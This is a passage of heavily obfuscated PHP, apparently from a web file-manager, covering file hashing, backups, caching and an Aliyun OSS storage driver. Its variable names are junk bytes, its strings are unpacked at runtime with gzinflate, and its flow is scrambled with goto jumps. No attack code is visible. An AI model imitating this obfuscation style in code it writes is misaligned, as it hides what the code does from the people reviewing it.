!$ÔØé×Ø[$­µ¸Ü›û[805]]) { return !1; } $ˆÚ®ßÊÎ = _get($ÔØé×Ø, $­µ¸Ü›û[413], 0); $ÜÍıØíö = array($­µ¸Ü›û[32] => $ÔØé×Ø[$­µ¸Ü›û[32]], $­µ¸Ü›û[87] => $úÌËŸèË, $­µ¸Ü›û[33] => $­µ¸Ü›û[230], $­µ¸Ü›û[79] => intval($ˆÚ®ßÊÎ), $­µ¸Ü›û[169] => get_path_ext($ÔØé×Ø[$­µ¸Ü›û[32]]), $­µ¸Ü›û[1433] => $ˆÚ®ßÊÎ > 0 && $ÔØé×Ø[$­µ¸Ü›û[1583]], $­µ¸Ü›û[1434] => !1); return $ÜÍıØíö; } private function header($…÷‹¶ôµ) { $‚šÏÉ¦± =& $_SERVER[‹è™Ü¸Ñ]; if (isset(self::$_cacheHeader[$…÷‹¶ôµ])) { return self::$_cacheHeader[$…÷‹¶ôµ]; } $­ó»Ú•Š = isset($GLOBALS[$‚šÏÉ¦±[1584]]) ? $GLOBALS[$‚šÏÉ¦±[1584]] : !1; $GLOBALS[$‚šÏÉ¦±[1584]] = !0; self::$_cacheHeader[$…÷‹¶ôµ] = url_header($…÷‹¶ôµ); $GLOBALS[$‚šÏÉ¦±[1584]] = $­ó»Ú•Š; return self::$_cacheHeader[$…÷‹¶ôµ]; } public function hashSimple($ä›õí—†, $øª„°¸™ = false) { $ì»îƒÊÅ =& $_SERVER[‹è™Ü¸Ñ]; $ò—£‡ö¨ = $this->info($ä›õí—†); if (!$ò—£‡ö¨ || !$ò—£‡ö¨[$ì»îƒÊÅ[232]]) { return !1; } $ÚÀÂˆĞ = $ò—£‡ö¨[$ì»îƒÊÅ[79]]; $£Àæş = 200; $ó÷†«øÂ = 50; if ($ÚÀÂˆĞ <= $£Àæş * $ó÷†«øÂ) { return md5($this->fileSubstr($ä›õí—†, 0, $ÚÀÂˆĞ)) . $ÚÀÂˆĞ; } $®‘‘ÕƒŞ = intval($ÚÀÂˆĞ / $ó÷†«øÂ); $´†ÜÏÃµ = $ì»îƒÊÅ[12]; $Ù—´ı•û = timeFloat(); $„€³¤Ò¤ = 15; for ($ìğÖ”¨„ = 0; $ìğÖ”¨„ < $ó÷†«øÂ; $ìğÖ”¨„++) { if (timeFloat() - $Ù—´ı•û > $„€³¤Ò¤) { return !1; } $Š÷ƒ—ö¥ = $this->fileSubstr($ä›õí—†, $®‘‘ÕƒŞ * $ìğÖ”¨„, $£Àæş); if (!$Š÷ƒ—ö¥) { return !1; } $´†ÜÏÃµ .= $Š÷ƒ—ö¥; } $´†ÜÏÃµ .= $this->fileSubstr($ä›õí—†, $ÚÀÂˆĞ - $£Àæş, $£Àæş); return md5($´†ÜÏÃµ) . $ÚÀÂˆĞ; } public function getContent($„ÆŞÖÈ) { return $this->fileSubstr($„ÆŞÖÈ); } public function fileSubstr($¯†ğ£ìğ, $‰øÂ‡û’ = 0, $·ØÛï¦× = -1) { $Äê©†ŒÉ =& $_SERVER[‹è™Ü¸Ñ]; $ˆ’±°³ = $this->info($¯†ğ£ìğ); if (!$ˆ’±°³ || !$ˆ’±°³[$Äê©†ŒÉ[232]] && $ˆ’±°³[$Äê©†ŒÉ[79]] > 1024 * 1024 * 10) { return !1; } if ($·ØÛï¦× === -1) { $·ØÛï¦× = $ˆ’±°³[$Äê©†ŒÉ[79]]; } if ($·ØÛï¦× == 0) { return $Äê©†ŒÉ[12]; } $¦ĞÛ«à± = array($Äê©†ŒÉ[1585] . $‰øÂ‡û’ . $Äê©†ŒÉ[840] . ($‰øÂ‡û’ + $·ØÛï¦× - 1)); $¸®¼ˆÉï = url_request($¯†ğ£ìğ, $Äê©†ŒÉ[261], !1, $¦ĞÛ«à±, !1, !1, 30); return $¸®¼ˆÉï[$Äê©†ŒÉ[1267]] ? $¸®¼ˆÉï[$Äê©†ŒÉ[1267]] : $Äê©†ŒÉ[12]; } public function download($×®ìş˜, $­ú¡Ÿø¿) { Downloader::start($×®ìş˜, $­ú¡Ÿø¿); return $­ú¡Ÿø¿; } } goto aŒ¿¯ª…÷; F£î¢Ò”ï¸: class BackupFile { public function __construct() { } public function index() { $ã‹ã±˜¾ = Backup::get(); $ş©ö‰íó = $ã‹ã±˜¾[$_SERVER[‹è™Ü¸Ñ][369]][$_SERVER[‹è™Ü¸Ñ][230]][$_SERVER[‹è™Ü¸Ñ][541]]; $¸Ì•ø›ë = array($_SERVER[‹è™Ü¸Ñ][542] => array($_SERVER[‹è™Ü¸Ñ][862], $ş©ö‰íó), $_SERVER[‹è™Ü¸Ñ][863] => array($_SERVER[‹è™Ü¸Ñ][407], $ã‹ã±˜¾[$_SERVER[‹è™Ü¸Ñ][807]])); $Òó„Û¿ = (int) Model($_SERVER[‹è™Ü¸Ñ][844])->where($¸Ì•ø›ë)->count($_SERVER[‹è™Ü¸Ñ][541]); $üûÚÂÙ = (int) Model($_SERVER[‹è™Ü¸Ñ][844])->where($¸Ì•ø›ë)->sum($_SERVER[‹è™Ü¸Ñ][79]); $Ÿ†òñ„ñ = new TaskFileTransfer($_SERVER[‹è™Ü¸Ñ][864], $_SERVER[‹è™Ü¸Ñ][838], $Òó„Û¿, LNG($_SERVER[‹è™Ü¸Ñ][839]) . $_SERVER[‹è™Ü¸Ñ][840] . LNG($_SERVER[‹è™Ü¸Ñ][865])); $Ÿ†òñ„ñ->task[$_SERVER[‹è™Ü¸Ñ][818]] = $üûÚÂÙ; $ºóø³ìĞ = array($_SERVER[‹è™Ü¸Ñ][866] => $Òó„Û¿, $_SERVER[‹è™Ü¸Ñ][867] => $üûÚÂÙ, $_SERVER[‹è™Ü¸Ñ][868] => time()); Backup::set($ºóø³ìĞ); $ıˆåŒíĞ = !0; $¡Şè‡¹– = $this->storeIds(); $›Ô£ñè¤ = 1; $–Á†Îš¸ = 1000; $¬…—Ÿ¨ù = $‚Ó©±•Õ = 0; $Ó§îûµ¥ = array(); $öÂËâ„ = $Å³š­æ¶ = 0; do { $ÊÈŸ¬½· = $_SERVER[‹è™Ü¸Ñ][869]; $Ï´™¹¹ó = Model($_SERVER[‹è™Ü¸Ñ][844])->where($¸Ì•ø›ë)->field($ÊÈŸ¬½·)->order($_SERVER[‹è™Ü¸Ñ][870])->selectPage($–Á†Îš¸, $›Ô£ñè¤); $À‡¾úö§ = !empty($Ï´™¹¹ó[$_SERVER[‹è™Ü¸Ñ][445]]) ? $Ï´™¹¹ó[$_SERVER[‹è™Ü¸Ñ][445]] : array(); foreach ($À‡¾úö§ as $©¨Å×ë) { if (!$this->_fileExist($©¨Å×ë, $Ó§îûµ¥, $¡Şè‡¹–)) { write_log("\x66\x69\154\145\40\156\x6f\164\x20\145\170\x69\163\164\56\146\x69\x6c\145\111\104\x3a{$©¨Å×ë[$_SERVER[‹è™Ü¸Ñ][541]]}\54\x20\160\141\164\x68\72{$©¨Å×ë[$_SERVER[‹è™Ü¸Ñ][87]]}", $_SERVER[‹è™Ü¸Ñ][871]); continue; } $«¾Ú¬ÇÌ = $©¨Å×ë[$_SERVER[‹è™Ü¸Ñ][87]]; $„Òêú = "\x7b\151\x6f\x3a{$ã‹ã±˜¾[$_SERVER[‹è™Ü¸Ñ][807]]}\x7d" . substr($«¾Ú¬ÇÌ, strlen("\173\x69\157\72{$©¨Å×ë[$_SERVER[‹è™Ü¸Ñ][872]]}\x7d")); if (IO::exist($„Òêú)) { $Ÿ†òñ„ñ->updateFileEnd($©¨Å×ë[$_SERVER[‹è™Ü¸Ñ][32]], $©¨Å×ë[$_SERVER[‹è™Ü¸Ñ][79]]); } else { $„Òêú = get_path_father($„Òêú); IO::mkdir($„Òêú); if (!IO::copy($«¾Ú¬ÇÌ, $„Òêú, $_SERVER[‹è™Ü¸Ñ][873])) { write_log($_SERVER[‹è™Ü¸Ñ][874] . $«¾Ú¬ÇÌ . $_SERVER[‹è™Ü¸Ñ][858] . $„Òêú . $_SERVER[‹è™Ü¸Ñ][178], $_SERVER[‹è™Ü¸Ñ][838]); $ıˆåŒíĞ = !1; break; } } $ş©ö‰íó = $©¨Å×ë[$_SERVER[‹è™Ü¸Ñ][541]]; $‚Ó©±•Õ += 1; $¬…—Ÿ¨ù += $©¨Å×ë[$_SERVER[‹è™Ü¸Ñ][79]]; $Å³š­æ¶ += 1; $öÂËâ„ += $©¨Å×ë[$_SERVER[‹è™Ü¸Ñ][79]]; if ($¬…—Ÿ¨ù >= 1024 * 1024 * 100) { $ºóø³ìĞ = array($_SERVER[‹è™Ü¸Ñ][806] => $ş©ö‰íó, $_SERVER[‹è™Ü¸Ñ][875] => $Å³š­æ¶, $_SERVER[‹è™Ü¸Ñ][876] => $öÂËâ„); Backup::set($ºóø³ìĞ); $¬…—Ÿ¨ù = $‚Ó©±•Õ = 0; } } $ñŒó’íê = count($À‡¾úö§); $›Ô£ñè¤++; } while ($ñŒó’íê == $–Á†Îš¸); $Ÿ†òñ„ñ->end(); $ºóø³ìĞ = array($_SERVER[‹è™Ü¸Ñ][877] => 1, $_SERVER[‹è™Ü¸Ñ][816] => time(), $_SERVER[‹è™Ü¸Ñ][830] => 1, $_SERVER[‹è™Ü¸Ñ][806] => $ş©ö‰íó, $_SERVER[‹è™Ü¸Ñ][878] => time()); if ($‚Ó©±•Õ) { $ºóø³ìĞ[$_SERVER[‹è™Ü¸Ñ][875]] = $Å³š­æ¶; $ºóø³ìĞ[$_SERVER[‹è™Ü¸Ñ][876]] = $öÂËâ„; } Backup::set($ºóø³ìĞ); return !0; } private function _fileExist($ÛÉ§É», &$ÅÜµî†›, $¢¼¼ûş) { $˜ •Óè =& $_SERVER[‹è™Ü¸Ñ]; $ÔË€´âò = $ÛÉ§É»[$˜ •Óè[87]]; if (in_array($ÛÉ§É»[$˜ •Óè[541]], $ÅÜµî†›)) { return !1; } if (!in_array($ÛÉ§É»[$˜ •Óè[872]], $¢¼¼ûş)) { return !1; } if (IO::exist($ÔË€´âò)) { return !0; } $Û¹©Ï±ô = get_path_father($ÔË€´âò); if (IO::exist($Û¹©Ï±ô)) { $ÅÜµî†›[] = $ÛÉ§É»[$˜ •Óè[541]]; return !1; } $°€¹¯Ÿé = array($˜ •Óè[872] => $ÛÉ§É»[$˜ •Óè[872]], $˜ •Óè[87] => array($˜ •Óè[459], "{$Û¹©Ï±ô}\x25")); $ğ•ºı = Model($˜ •Óè[844])->where($°€¹¯Ÿé)->field($˜ •Óè[542])->select(); $ÅÜµî†› = array_merge($ÅÜµî†›, array_to_keyvalue($ğ•ºı, $˜ •Óè[12], $˜ •Óè[541])); return !1; } private function _fileFilter($Ò×ŞçƒÀ) { $ˆÏŒÊ‹Ç =& $_SERVER[‹è™Ü¸Ñ]; return; if (empty($Ò×ŞçƒÀ)) { return; } $Ôğ¯À = array($ˆÏŒÊ‹Ç[541] => array($ˆÏŒÊ‹Ç[7], array_unique($Ò×ŞçƒÀ))); $¼¤„¶¶ö = Model($ˆÏŒÊ‹Ç[879])->where($Ôğ¯À)->field($ˆÏŒÊ‹Ç[193])->select(); foreach ($¼¤„¶¶ö as $÷ôÃÓ±Ç) { Model($ˆÏŒÊ‹Ç[879])->remove($÷ôÃÓ±Ç[$ˆÏŒÊ‹Ç[193]], !1); } } private function storeIds() { $ÎÙË‰Ùª =& $_SERVER[‹è™Ü¸Ñ]; $ÆóÎóÏ² = Model($ÎÙË‰Ùª[822])->listData(); $·–¤©ù¶ = array(); $ŞÃÂÂ—Š = $GLOBALS[$ÎÙË‰Ùª[6]][$ÎÙË‰Ùª[92]][$ÎÙË‰Ùª[880]]; foreach ($ÆóÎóÏ² as $˜ƒ‹Ÿ“²) { $™½íùî = strtolower($˜ƒ‹Ÿ“²[$ÎÙË‰Ùª[98]]); if (!isset($ŞÃÂÂ—Š[$™½íùî])) { continue; } $“°€¸½¨ = $ÎÙË‰Ùª[77] . (isset($ŞÃÂÂ—Š[$™½íùî]) ? $ŞÃÂÂ—Š[$™½íùî] : ucfirst($™½íùî)); if (!class_exists($“°€¸½¨)) { continue; } $·–¤©ù¶[] = $˜ƒ‹Ÿ“²[$ÎÙË‰Ùª[475]]; } return $·–¤©ù¶; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ÒÖô¥Ñà =& $_SERVER[‹è™Ü¸Ñ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ñÚÖÂÏ = $GLOBALS[$ÒÖô¥Ñà[6]][$ÒÖô¥Ñà[425]]; $‰ˆ™¸• = $ñÚÖÂÏ[$ñÚÖÂÏ[$ÒÖô¥Ñà[881]]]; $£§„†Ò¢ = $ñÚÖÂÏ[$ÒÖô¥Ñà[882]]; switch ($ñÚÖÂÏ[$ÒÖô¥Ñà[881]]) { case $ÒÖô¥Ñà[21]: self::$handle = Model($ÒÖô¥Ñà[883]); break; case $ÒÖô¥Ñà[884]: self::$handle = new CacheRedis($‰ˆ™¸•, $£§„†Ò¢); break; case $ÒÖô¥Ñà[885]: self::$handle = new CacheMemcached($‰ˆ™¸•, $£§„†Ò¢); break; case $ÒÖô¥Ñà[230]: self::$handle = new CacheFile($‰ˆ™¸•, $£§„†Ò¢); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($öÕÉ§Êä) { if (is_array($öÕÉ§Êä) || is_object($öÕÉ§Êä)) { $öÕÉ§Êä = json_encode($öÕÉ§Êä); } $öÕÉ§Êä = rawurlencode($öÕÉ§Êä); return md5(KOD_SITE_ID . $_SERVER[‹è™Ü¸Ñ][11] . $öÕÉ§Êä); } public static function get($½ª™š‡â, $ğ›ê…ˆÁ = false) { $ı‹™¬É¤ = self::key($½ª™š‡â); $–ÓÚ¹‚ = self::init(); if ($ğ›ê…ˆÁ) { return unserialize($–ÓÚ¹‚->get($ı‹™¬É¤)); } if (!isset(self::$memoryCache[$ı‹™¬É¤])) { $ÜÍ¶ç‚‘ = $–ÓÚ¹‚->get($ı‹™¬É¤); self::$memoryCache[$ı‹™¬É¤] = unserialize($ÜÍ¶ç‚‘); } return self::$memoryCache[$ı‹™¬É¤]; } public static function set($¦ÊñÊãÖ, $™‚˜³ĞÖ, $ØÛß÷ì© = false) { $Å§ßÌ¸ =& $_SERVER[‹è™Ü¸Ñ]; $ÈÎ“÷¨ = self::key($¦ÊñÊãÖ); if (isset(self::$memoryCache[$ÈÎ“÷¨]) && self::$memoryCache[$ÈÎ“÷¨] === $™‚˜³ĞÖ) { return !0; } if ($ØÛß÷ì© === 0) { self::$memoryCache[$ÈÎ“÷¨] = $™‚˜³ĞÖ; return !0; } $ÛŒßÂ¢× = self::init(); $‚ˆÒ„Ô = serialize($™‚˜³ĞÖ); CacheLock::lock($¦ÊñÊãÖ . $Å§ßÌ¸[886]); $œšë×ûÓ = $ÛŒßÂ¢×->set($ÈÎ“÷¨, $‚ˆÒ„Ô, $ØÛß÷ì©); self::$memoryCache[$ÈÎ“÷¨] = $™‚˜³ĞÖ; CacheLock::unlock($¦ÊñÊãÖ . $Å§ßÌ¸[886]); return $œšë×ûÓ; } public static function getCall($ğâŞ½®Ñ, $•ÊÌ·Èø, $‡©¥Ôşò, $Ğç²µ = array()) { $õ±İ¾ˆÓ =& $_SERVER[‹è™Ü¸Ñ]; $Š½“èğŸ = self::get($ğâŞ½®Ñ); if ($Š½“èğŸ || $Š½“èğŸ === $õ±İ¾ˆÓ[12]) { return $Š½“èğŸ; } $Š½“èğŸ = call_user_func_array($‡©¥Ôşò, $Ğç²µ); $Š½“èğŸ = $Š½“èğŸ ? $Š½“èğŸ : $õ±İ¾ˆÓ[12]; self::set($ğâŞ½®Ñ, $Š½“èğŸ, $•ÊÌ·Èø); return $Š½“èğŸ; } public static function remove($òáÉ ©Á) { $Æ½ÏÕè¼ = self::key($òáÉ ©Á); unset(self::$memoryCache[$Æ½ÏÕè¼]); self::clearTimeout(); CacheLock::lock($òáÉ ©Á); $¤‡àÖ©ú = self::init()->remove($Æ½ÏÕè¼); CacheLock::unlock($òáÉ ©Á); return $¤‡àÖ©ú; } public static function removeMemory($½ê‹¤ëó) { $¬•Ğ™³± = self::key($½ê‹¤ëó); unset(self::$memoryCache[$¬•Ğ™³±]); } public static function clearMemory($¼Å»½ëÁ = false) { if ($¼Å»½ëÁ) { $¼Å»½ëÁ = self::key($¼Å»½ëÁ); unset(self::$memoryCache[$¼Å»½ëÁ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[‹è™Ü¸Ñ][887])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[‹è™Ü¸Ñ][888])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ìÜü½’¦, $’Ùäèá) { $ÊÅ£Ëà =& $_SERVER[‹è™Ü¸Ñ]; $this->cachePath = $ìÜü½’¦[$ÊÅ£Ëà[87]]; $this->prefix = $ÊÅ£Ëà[889]; $this->cacheTime = $’Ùäèá; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($š œ‰Ä) { $ô‡¾ßÑÅ =& $_SERVER[‹è™Ü¸Ñ]; $š œ‰Ä = str_replace(array($ô‡¾ßÑÅ[890], $ô‡¾ßÑÅ[100], $ô‡¾ßÑÅ[76]), $ô‡¾ßÑÅ[891], $š œ‰Ä); return $this->cachePath . $ô‡¾ßÑÅ[892] . $š œ‰Ä . $ô‡¾ßÑÅ[893]; } public function set($£à‚ø¶Ğ, $ú²áÌ§œ, $ÎÈ­¨—ª = false) { $ÎÈ­¨—ª = $ÎÈ­¨—ª ? $ÎÈ­¨—ª : $this->cacheTime; $Î”×Á” = $this->getFile($£à‚ø¶Ğ); if (file_put_contents($Î”×Á”, $this->prefix . $ú²áÌ§œ, LOCK_EX)) { @touch($Î”×Á”, intval(time() + $ÎÈ­¨—ª)); clearstatcache(); return !0; } @unlink($Î”×Á”); return !1; } public function get($êäÀŸĞÇ) { $Ûˆğ×†ä = $this->getFile($êäÀŸĞÇ); if (file_exists($Ûˆğ×†ä) && filemtime($Ûˆğ×†ä) < time()) { @unlink($Ûˆğ×†ä); return !1; } $ş¯øˆåÜ = @file_get_contents($Ûˆğ×†ä); return substr($ş¯øˆåÜ, strlen($this->prefix)); } public function remove($åıÒ±î”) { $¤õ¹¯”ş = $this->getFile($åıÒ±î”); return @unlink($¤õ¹¯”ş); } public function deleteAll() { $…í Ó†Ÿ =& $_SERVER[‹è™Ü¸Ñ]; $¥¢–µ³ = scandir($this->cachePath); foreach ($¥¢–µ³ as $™¨îÒ«ï) { $‚²Ï§ì‰ = $this->cachePath . $™¨îÒ«ï; if (strpos($‚²Ï§ì‰, $…í Ó†Ÿ[893]) && strpos($‚²Ï§ì‰, $…í Ó†Ÿ[894])) { @unlink($‚²Ï§ì‰); } } } public function clearTimeout() { $ôÌ¾½÷ú =& $_SERVER[‹è™Ü¸Ñ]; $ÄìÌÆ¿ = scandir($this->cachePath); foreach ($ÄìÌÆ¿ as $Ó—•Ü¿Ÿ) { $¿Ìëıı = $this->cachePath . $Ó—•Ü¿Ÿ; if (strpos($¿Ìëıı, $ôÌ¾½÷ú[893]) && strpos($¿Ìëıı, $ôÌ¾½÷ú[894]) && filemtime($¿Ìëıı) < time()) { @unlink($¿Ìëıı); } } } } goto B•ƒ£š´Ôš; FÙÉ˜­¼–: define($_SERVER[‹è™Ü¸Ñ][0], $_SERVER[‹è™Ü¸Ñ][1]); $_SERVER[ÅŸÍ¬ı©] = explode($_SERVER[‹è™Ü¸Ñ][2], gzinflate(substr($_SERVER[‹è™Ü¸Ñ][3], 10, -8))); function binCheckEq($¬ÅÖâÔÓ, $æ‘æ¼Ê) { return $¬ÅÖâÔÓ == $æ‘æ¼Ê; } goto F¦ƒíÀŒÉÂ; F®ÚÑ…à’: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($©ïü†ô‚) { parent::__construct($©ïü†ô‚); $this->setSignVersion($_SERVER[‹è™Ü¸Ñ][247]); } public function fileOutLink($åÏÈ–µ) { $ã«É½ÀÄ =& $_SERVER[‹è™Ü¸Ñ]; if (substr($åÏÈ–µ, 0, 7) == $ã«É½ÀÄ[313]) { $åÏÈ–µ = $ã«É½ÀÄ[314] . substr($åÏÈ–µ, 7); } header($ã«É½ÀÄ[175] . $åÏÈ–µ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($‡ôÂ¢±¦) { parent::__construct(); include_once SDK_DIR . $_SERVER[‹è™Ü¸Ñ][1440]; $this->_init($‡ôÂ¢±¦); } public function _init($’¨²ŞÊ) { $ã™©ùÓ =& $_SERVER[‹è™Ü¸Ñ]; $this->config = $’¨²ŞÊ; foreach ($’¨²ŞÊ as $ÃÁ›ä© => $£ˆ¸’Ğ¹) { if (isset($this->{$ÃÁ›ä©})) { $this->{$ÃÁ›ä©} = $£ˆ¸’Ğ¹; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ã™©ùÓ[1441] . LNG($ã™©ùÓ[1442])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¸”ÁßØ— =& $_SERVER[‹è™Ü¸Ñ]; $æè¸Ô®„ = new OSS\Model\CorsConfig(); $»›ü§±Ğ = new OSS\Model\CorsRule(); $»›ü§±Ğ->addAllowedOrigin($¸”ÁßØ—[1443]); $»›ü§±Ğ->addAllowedMethod($¸”ÁßØ—[1444]); $»›ü§±Ğ->addAllowedMethod($¸”ÁßØ—[1445]); $»›ü§±Ğ->addAllowedMethod($¸”ÁßØ—[1446]); $»›ü§±Ğ->addAllowedMethod($¸”ÁßØ—[1447]); $»›ü§±Ğ->addAllowedMethod($¸”ÁßØ—[165]); $»›ü§±Ğ->setMaxAgeSeconds(600); $»›ü§±Ğ->addExposeHeader($¸”ÁßØ—[1448]); $»›ü§±Ğ->addAllowedHeader($¸”ÁßØ—[1443]); $æè¸Ô®„->addRule($»›ü§±Ğ); try { $this->client->putBucketCors($this->bucket, $æè¸Ô®„); } catch (OSS\Core\OssException $áÑÎ™Ö‰) { $this->writeLog(__FUNCTION__ . $¸”ÁßØ—[214] . $áÑÎ™Ö‰->getMessage()); return !1; } return !0; } public function getBucketCors() { $ë†ÈÙåı =& $_SERVER[‹è™Ü¸Ñ]; $‰­„Ÿ˜Ç = null; try { $‰­„Ÿ˜Ç = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ñ›ñ‘Íµ) { $this->writeLog(__FUNCTION__ . $ë†ÈÙåı[214] . $ñ›ñ‘Íµ->getMessage()); return null; } if (!$‰­„Ÿ˜Ç || !($ÒæíŠÏ‘ = $‰­„Ÿ˜Ç->getRules())) { return null; } $şÆìæ  = $ÒæíŠÏ‘[0]->getAllowedOrigins(); $ì×¥‚İá = $ÒæíŠÏ‘[0]->getAllowedMethods(); $§é÷¼ïÜ = $ÒæíŠÏ‘[0]->getMaxAgeSeconds(); $”ØÇ…îó = $ÒæíŠÏ‘[0]->getExposeHeaders(); $Øéáˆ›Ş = $ÒæíŠÏ‘[0]->getAllowedHeaders(); return array($ë†ÈÙåı[218] => isset($şÆìæ [0]) ? $şÆìæ [0] : $ë†ÈÙåı[12], $ë†ÈÙåı[222] => $ì×¥‚İá, $ë†ÈÙåı[1449] => $§é÷¼ïÜ, $ë†ÈÙåı[1450] => isset($”ØÇ…îó[0]) ? $”ØÇ…îó[0] : $ë†ÈÙåı[12], $ë†ÈÙåı[219] => isset($Øéáˆ›Ş[0]) ? $Øéáˆ›Ş[0] : $ë†ÈÙåı[12]); } public function isBucketCors() { $©¿¶Ò„Õ =& $_SERVER[‹è™Ü¸Ñ]; $õ¥ˆÍß = $this->getBucketCors(); if (!$õ¥ˆÍß || !is_array($õ¥ˆÍß)) { return !1; } if ($õ¥ˆÍß[$©¿¶Ò„Õ[218]] != $©¿¶Ò„Õ[220] || $õ¥ˆÍß[$©¿¶Ò„Õ[219]] != $©¿¶Ò„Õ[220]) { return !1; } $‰öáğÀ† = array_map($©¿¶Ò„Õ[221], $õ¥ˆÍß[$©¿¶Ò„Õ[222]]); if (!is_array($‰öáğÀ†)) { $‰öáğÀ† = array(); } $û¬ë™Ğ° = array($©¿¶Ò„Õ[223], $©¿¶Ò„Õ[224], $©¿¶Ò„Õ[225], $©¿¶Ò„Õ[226], $©¿¶Ò„Õ[227]); $ˆ–½æ¤Ÿ = array_diff($û¬ë™Ğ°, $‰öáğÀ†); return empty($ˆ–½æ¤Ÿ); } public function mkfile($•‰ì¦Œ—, $µÕøÇïù = '', $­èÆË‰Ê = REPEAT_RENAME) { $Õ¥€Óİ¼ = $this->setContent($•‰ì¦Œ—, $µÕøÇïù); if ($Õ¥€Óİ¼ !== !1) { return $this->getPathOuter($•‰ì¦Œ—); } return !1; } public function mkdir($‘ãõêà›, $Ä”‰Ê = REPEAT_SKIP) { if ($Ä”‰Ê && $this->_isFolder($‘ãõêà›)) { return $this->getPathOuter($‘ãõêà›); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($‘ãõêà›)); } catch (OSS\Core\OssException $ÇÀÇ«”) { $this->writeLog(__FUNCTION__ . $_SERVER[‹è™Ü¸Ñ][214] . $ÇÀÇ«”->getMessage()); return !1; } return $this->getPathOuter($‘ãõêà›); } private function fileList($›•Â†…š, $åıÏ«ñÀ = '', $ÈÂï üŞ = 0) { $·­×£Õó =& $_SERVER[‹è™Ü¸Ñ]; $›•Â†…š = trim($›•Â†…š, $·­×£Õó[8]); $Şá«×¨í = empty($›•Â†…š) && $›•Â†…š !== $·­×£Õó[228] ? $·­×£Õó[12] : $›•Â†…š . $·­×£Õó[8]; $ÚÌ…àò“ = $·­×£Õó[12]; $ôÄÇªŒÑ = 1000; $«¦‡ì“ = $’£ÚÒ“ = array(); while (!0) { check_abort(); $†ó¿ùÓ¹ = array($·­×£Õó[1451] => $åıÏ«ñÀ, $·­×£Õó[1452] => $Şá«×¨í, $·­×£Õó[1453] => $ôÄÇªŒÑ, $·­×£Õó[1454] => $ÚÌ…àò“); try { $¤Ü·ìÓ† = $this->client->listObjects($this->bucket, $†ó¿ùÓ¹); } catch (OSS\Core\OssException $“åÇà¨§) { $this->writeLog(__FUNCTION__ . $·­×£Õó[214] . $“åÇà¨§->getMessage()); break; } $ÚÌ…àò“ = $¤Ü·ìÓ†->getNextMarker(); $¦®¹›Ê = $¤Ü·ìÓ†->getObjectList(); $õ§‡ŒÊñ = $¤Ü·ìÓ†->getPrefixList(); foreach ($¦®¹›Ê as $ Ğûçø‡) { if ($ Ğûçø‡->getKey() == $Şá«×¨í) { continue; } $¯›‰¡êé = $ Ğûçø‡->getKey(); $Ò§Ï¢™ú = $ Ğûçø‡->getSize(); $ñ¹‰Ú– = $ Ğûçø‡->getLastModified(); $±À¥‘ Ò = trim($ Ğûçø‡->getETag(), $·­×£Õó[121]); $òıı— = $ÈÂï üŞ ? array($·­×£Õó[32] => $¯›‰¡êé, $·­×£Õó[79] => $Ò§Ï¢™ú, $·­×£Õó[206] => strtotime($ñ¹‰Ú–), $·­×£Õó[1455] => $±À¥‘ Ò) : $¯›‰¡êé; $ƒ¼¿ñ¨Å = $Ò§Ï¢™ú == 0 && substr($¯›‰¡êé, strlen($¯›‰¡êé) - 1, 1) == $·­×£Õó[8] ? !0 : !1; $Ã¡¬œ’¤ = array($·­×£Õó[79] => $Ò§Ï¢™ú, $·­×£Õó[1456] => $Ò§Ï¢™ú, $·­×£Õó[88] => strtotime($ñ¹‰Ú–), $·­×£Õó[1457] => $ñ¹‰Ú–, $·­×£Õó[1455] => $±À¥‘ Ò); $this->cacheMethodInfoSet($¯›‰¡êé, $ƒ¼¿ñ¨Å, $Ã¡¬œ’¤); if ($ƒ¼¿ñ¨Å) { $«¦‡ì“[] = $¯›‰¡êé; continue; } $’£ÚÒ“[] = $òıı—; } foreach ($õ§‡ŒÊñ as $üóŸ¦Ö) { $«¦‡ì“[] = $üóŸ¦Ö->getPrefix(); $this->cacheMethodInfoSet($üóŸ¦Ö->getPrefix(), !0); } if ($ÚÌ…àò“ === $·­×£Õó[12]) { break; } } $this->cacheMethodInfoSet($›•Â†…š, !0); return array($·­×£Õó[85] => $«¦‡ì“, $·­×£Õó[86] => $’£ÚÒ“); } public function listObject($ÀÎÃĞê, $ê“™ÃÃğ = '') { $İĞİÚ± =& $_SERVER[‹è™Ü¸Ñ]; $ÀÎÃĞê = trim($ÀÎÃĞê, $İĞİÚ±[8]); $äŠ½ºƒĞ = empty($ÀÎÃĞê) && $ÀÎÃĞê !== $İĞİÚ±[228] ? $İĞİÚ±[12] : $ÀÎÃĞê . $İĞİÚ±[8]; $âË·ÉÕ¸ = $İĞİÚ±[12]; $äàº¨û = 1000; $Ä€Ë¬Å = $öäÒŠ¬Ò = array(); while (!0) { check_abort(); $¨´£üèˆ = array($İĞİÚ±[1451] => $ê“™ÃÃğ, $İĞİÚ±[1452] => $äŠ½ºƒĞ, $İĞİÚ±[1453] => $äàº¨û, $İĞİÚ±[1454] => $âË·ÉÕ¸); try { $îÉé¬ä™ = $this->client->listObjects($this->bucket, $¨´£üèˆ); } catch (OSS\Core\OssException $ñ×·ÚÛ) { $this->writeLog(__FUNCTION__ . $İĞİÚ±[214] . $ñ×·ÚÛ->getMessage()); break; } $âË·ÉÕ¸ = $îÉé¬ä™->getNextMarker(); $äì‡åôì = $îÉé¬ä™->getObjectList(); foreach ($äì‡åôì as 